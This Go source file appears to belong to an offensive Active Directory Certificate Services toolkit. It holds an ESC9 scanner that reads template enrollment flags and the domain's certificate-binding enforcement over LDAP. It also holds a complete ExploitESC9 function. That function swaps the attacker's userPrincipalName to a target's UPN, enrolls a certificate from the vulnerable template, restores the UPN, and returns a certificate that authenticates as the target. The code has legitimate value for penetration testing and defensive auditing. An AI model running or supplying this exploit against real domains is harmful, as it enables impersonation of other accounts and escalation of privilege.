package pki

import (
	"context"
	"crypto"
	"crypto/x509"
	"fmt"

	"github.com/go-ldap/ldap/v3"
	"github.com/loudmumble/trusted/pkg/util"
)

// ctFlagNoSecurityExtension is the msPKI-Enrollment-Flag bit that suppresses
// the szOID_NTDS_CA_SECURITY_EXT extension in issued certificates.
// When set, the CA does not embed the requester's SID — enabling ESC9.
const ctFlagNoSecurityExtension uint32 = 0x00080000

// ESC9Finding represents a template vulnerable to ESC9 (CT_FLAG_NO_SECURITY_EXTENSION).
type ESC9Finding struct {
	TemplateName           string `json:"template_name"`
	HasNoSecurityExtension bool   `json:"has_no_security_extension"`
	BindingEnforcement     int    `json:"binding_enforcement"` // 0=disabled, 1=compat, 2=full, -1=unknown
	AuthenticationEKU      bool   `json:"authentication_eku"`
}

// CheckESC9Registry reads the StrongCertificateBindingEnforcement registry-equivalent
// value from the domain root object via LDAP (msDS-StrongCertificateBindingEnforcement).
//
// Return values:
//
//	0 = disabled (exploitable)
//	1 = compatibility mode (exploitable)
//	2 = full enforcement (not exploitable)
//	-1 = attribute not found / unknown
func CheckESC9Registry(cfg *ADCSConfig) (int, error) {
	conn, err := ConnectLDAP(context.Background(), cfg)
	if err != nil {
		return -1, fmt.Errorf("LDAP connect: %w", err)
	}
	defer conn.Close()

	domainDN := buildDomainDN(cfg.Domain)
	fmt.Printf("[*] Checking StrongCertificateBindingEnforcement on %s\n", domainDN)

	searchReq := ldap.NewSearchRequest(
		domainDN, ldap.ScopeBaseObject, ldap.NeverDerefAliases,
		0, 0, false,
		"(objectClass=*)",
		[]string{"msDS-StrongCertificateBindingEnforcement"},
		nil,
	)

	result, err := conn.Search(searchReq)
	if err != nil {
		return -1, fmt.Errorf("LDAP search for binding enforcement: %w", err)
	}

	if len(result.Entries) == 0 {
		fmt.Println("[!] Domain root object not found — cannot determine binding enforcement")
		return -1, nil
	}

	val := result.Entries[0].GetAttributeValue("msDS-StrongCertificateBindingEnforcement")
	if val == "" {
		fmt.Println("[*] msDS-StrongCertificateBindingEnforcement not set — defaulting to unknown (-1)")
		return -1, nil
	}

	var enforcement int
	if _, err := fmt.Sscanf(val, "%d", &enforcement); err != nil {
		return -1, fmt.Errorf("parse binding enforcement value %q: %w", val, err)
	}

	labels := map[int]string{
		0: "Disabled (EXPLOITABLE)",
		1: "Compatibility mode (EXPLOITABLE)",
		2: "Full enforcement (not exploitable)",
	}
	label, ok := labels[enforcement]
	if !ok {
		label = "Unknown value"
	}
	fmt.Printf("[+] StrongCertificateBindingEnforcement = %d (%s)\n", enforcement, label)

	return enforcement, nil
}

// ScanESC9 identifies templates vulnerable to ESC9 by checking for the
// CT_FLAG_NO_SECURITY_EXTENSION enrollment flag combined with an authentication
// EKU, then cross-referencing with the domain's StrongCertificateBindingEnforcement.
func ScanESC9(ctx context.Context, cfg *ADCSConfig, conn *ldap.Conn) ([]ESC9Finding, error) {
	fmt.Println("[*] Scanning for ESC9 (CT_FLAG_NO_SECURITY_EXTENSION)...")

	enforcement, err := CheckESC9Registry(cfg)
	if err != nil {
		fmt.Printf("[!] Could not determine binding enforcement: %v\n", err)
		fmt.Println("[*] Continuing scan — findings will note unknown enforcement")
	}

	if enforcement == 2 {
		fmt.Println("[*] Full binding enforcement enabled — ESC9 not exploitable, but flagging templates anyway")
	}

	templates, err := EnumerateTemplates(ctx, cfg, conn)
	if err != nil {
		return nil, fmt.Errorf("enumerate templates: %w", err)
	}

	var findings []ESC9Finding
	for _, tmpl := range templates {
		hasFlag := tmpl.EnrollmentFlag&ctFlagNoSecurityExtension != 0
		if !hasFlag {
			continue
		}
		if !tmpl.AuthenticationEKU {
			continue
		}

		finding := ESC9Finding{
			TemplateName:           tmpl.Name,
			HasNoSecurityExtension: true,
			BindingEnforcement:     enforcement,
			AuthenticationEKU:      true,
		}
		findings = append(findings, finding)

		status := "EXPLOITABLE"
		if enforcement == 2 {
			status = "mitigated (full enforcement)"
		} else if enforcement == -1 {
			status = "exploitable (enforcement unknown — assume vulnerable)"
		}
		fmt.Printf("[!] ESC9: %s — NO_SECURITY_EXTENSION + auth EKU [%s]\n", tmpl.Name, status)
	}

	return findings, nil
}

// ExploitESC9 exploits an ESC9-vulnerable template by temporarily modifying the
// attacker's userPrincipalName to the target UPN, requesting a certificate from
// the vulnerable template, then restoring the original UPN.
//
// Because the template has CT_FLAG_NO_SECURITY_EXTENSION, the issued certificate
// will not contain the szOID_NTDS_CA_SECURITY_EXT extension (requester SID).
// With StrongCertificateBindingEnforcement < 2, the DC maps the certificate
// based solely on the UPN in the SAN — which is the target's UPN.
//
// Requires: write access to the attacker's own userPrincipalName attribute.
func ExploitESC9(ctx context.Context, cfg *ADCSConfig, conn *ldap.Conn, templateName, attackerDN, targetUPN string) (*x509.Certificate, crypto.Signer, error) {
	fmt.Printf("[!] ESC9 Exploitation: template=%s attacker=%s target=%s\n", templateName, attackerDN, targetUPN)

	// Step 0: Verify template is ESC9 vulnerable
	templates, err := EnumerateTemplates(ctx, cfg, conn)
	if err != nil {
		return nil, nil, fmt.Errorf("enumerate templates: %w", err)
	}

	var vulnTemplate *CertTemplate
	for i, t := range templates {
		if t.Name == templateName {
			vulnTemplate = &templates[i]
			break
		}
	}
	if vulnTemplate == nil {
		return nil, nil, fmt.Errorf("template %q not found", templateName)
	}

	isESC9 := false
	for _, v := range vulnTemplate.ESCVulns {
		if v == "ESC9" {
			isESC9 = true
			break
		}
	}
	if !isESC9 {
		return nil, nil, fmt.Errorf("template %q is not ESC9 vulnerable (vulns: %v)", templateName, vulnTemplate.ESCVulns)
	}

	fmt.Printf("[+] Template %q confirmed ESC9 vulnerable\n", templateName)

	// Step 1: Read attacker's current userPrincipalName
	fmt.Printf("[*] Step 1: Reading attacker's current UPN from %s\n", attackerDN)
	searchReq := ldap.NewSearchRequest(
		attackerDN, ldap.ScopeBaseObject, ldap.NeverDerefAliases,
		0, 0, false,
		"(objectClass=*)",
		[]string{"userPrincipalName"},
		nil,
	)

	result, err := conn.Search(searchReq)
	if err != nil {
		return nil, nil, fmt.Errorf("read attacker UPN: %w", err)
	}
	if len(result.Entries) == 0 {
		return nil, nil, fmt.Errorf("attacker DN %q not found", attackerDN)
	}

	originalUPN := result.Entries[0].GetAttributeValue("userPrincipalName")
	fmt.Printf("[+] Attacker's original UPN: %q\n", originalUPN)

	// restoreUPN is called on both success and failure — mirrors ESC4 restore pattern
	restoreUPN := func() {
		fmt.Println("[*] Restoring attacker's original UPN...")
		restoreReq := ldap.NewModifyRequest(attackerDN, nil)
		if originalUPN != "" {
			restoreReq.Replace("userPrincipalName", []string{originalUPN})
		} else {
			// Original had no UPN — delete the attribute
			restoreReq.Delete("userPrincipalName", []string{})
		}
		if err := conn.Modify(restoreReq); err != nil {
			fmt.Printf("[!] WARNING: Failed to restore attacker UPN: %v\n", err)
			fmt.Printf("[!] Manual fix: set userPrincipalName on %s back to %q\n", attackerDN, originalUPN)
		} else {
			fmt.Println("[+] Attacker UPN restored to original value")
		}
	}

	// Step 2: Modify attacker's UPN to target UPN
	fmt.Printf("[*] Step 2: Setting attacker UPN to %s\n", targetUPN)
	modReq := ldap.NewModifyRequest(attackerDN, nil)
	modReq.Replace("userPrincipalName", []string{targetUPN})
	if err := conn.Modify(modReq); err != nil {
		return nil, nil, fmt.Errorf("modify attacker UPN to %s: %w", targetUPN, err)
	}
	fmt.Printf("[+] Attacker UPN changed to: %s\n", targetUPN)

	// Step 3: Enroll for a certificate from the vulnerable template.
	// The ESC9 attack path relies on the attacker's UPN being set to the target — the
	// CA issues a cert with that UPN in the SAN but without the security extension.
	// After UPN swap, normal enrollment works because the attacker's UPN matches the target.
	fmt.Printf("[*] Step 3: Enrolling for certificate from template %q\n", templateName)
	cert, certKey, err := EnrollCertificate(cfg, templateName, targetUPN, false)
	if err != nil {
		// Step 4 (failure path): Restore UPN before returning error
		restoreUPN()
		return nil, nil, fmt.Errorf("certificate request for %s via template %s: %w", targetUPN, templateName, err)
	}

	// Step 4 (success path): Restore attacker's original UPN
	restoreUPN()

	// Step 5: Return the certificate
	fmt.Printf("[+] ESC9 exploitation complete — certificate issued for %s\n", targetUPN)
	fmt.Printf("[*] The certificate lacks szOID_NTDS_CA_SECURITY_EXT (no requester SID)\n")
	fmt.Printf("[*] With StrongCertificateBindingEnforcement < 2, this cert authenticates as %s\n", targetUPN)
	return cert, certKey, nil
}

func buildDomainDN(domain string) string {
	return util.BuildDomainDN(domain)
}
